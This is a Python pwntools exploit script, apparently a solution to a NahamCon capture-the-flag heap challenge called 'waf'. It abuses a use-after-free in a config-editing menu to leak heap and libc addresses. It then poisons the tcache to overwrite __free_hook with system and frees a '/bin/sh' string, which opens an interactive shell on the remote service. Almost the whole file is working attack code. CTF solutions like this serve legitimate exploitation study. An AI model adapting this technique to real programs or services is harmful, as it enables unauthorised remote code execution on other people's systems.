#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

# def get_base_address(proc):
#     return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)
# "set $_base = 0x{:x}".format(get_base_address(io))

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./waf_patched')
		if debug:
			gdb.attach(io, gdbscript='''
              handle SIGALRM ignore
              b* main+594
              c
			''')
		else:
			pass
	else:
		io = remote('challenge.nahamcon.com',30359)

	return io

io = conn()

elf = ELF('./waf_patched')
libc = ELF('libc.so.6')


def add_config(id, size, cnt, choice='y'):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'What is the id of the config?: ', str(id).encode())
    io.sendlineafter(b'What is the size of the setting?: ', str(size).encode())
    io.sendlineafter(b'What is the setting to be added?: ', cnt)
    io.sendlineafter(b'Should this setting be active? [y/n]: ', choice.encode())
    
def edit(id, new_id, size, cnt, choice='y'):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'What is the index of the config to edit?: ', str(id).encode())
    io.sendlineafter(b'What is the new ID?: ', str(new_id).encode())
    io.sendlineafter(b'What is the new size of the setting?: ', str(size).encode())
    io.sendlineafter(b'What is the new setting?: ', cnt)
    io.sendlineafter(b'Should this be active? [y/n]: ', choice.encode())
    
    
def remove():
    io.sendlineafter(b'> ', b'4')
    
def print_all():
    io.sendlineafter(b'> ', b'5')
    
def exit():
    return io.sendlineafter(b'> ', b'6')

add_config(1, 6, b"a"*15, 'y')

remove()

io.sendline(b'3')
io.sendline(b'0')
io.recvuntil(b'ID: ')
heap_leak = io.recvline().strip(b'\n')
heap_leak = int(heap_leak.decode())
log.success('leak_heap ' + hex(heap_leak))
sleep(1)
stdin = 0x602020+1
edit(0, heap_leak-0x20, 16, p8(0x2), 'y')

add_config(0, 16, p64(0xcafebabe)+p64(stdin), 'y')

io.sendline(b'3')
io.sendline(b'0')
io.recvuntil(b'Setting: ')
libc_leak = b'\0' + io.recvline().strip(b'\n')
libc_leak = u64(libc_leak.ljust(8, b'\x00'))
libc_base = libc_leak - 0x3eba00
log.success('libc_base ' +hex(libc_base))
sleep(1)
free_hook = libc_base + libc.symbols.__free_hook
system = libc_base + libc.symbols.system

log.success('Free_hook ' + hex(free_hook))
sleep(1)
log.success('System '+hex(system))

add_config(0, 16, b"a", 'y')
add_config(0, 32, b"b"*31, 'y')
remove()

edit(2, heap_leak+0x80, 16, p64(0x100)+p64(0), 'y')
add_config(0, 32, p64(free_hook), 'y')
add_config(0, 16, p64(system), 'y')
add_config(0, 16, b"/bin/sh\x00", 'y') 
remove()
sleep(1)

io.interactive()

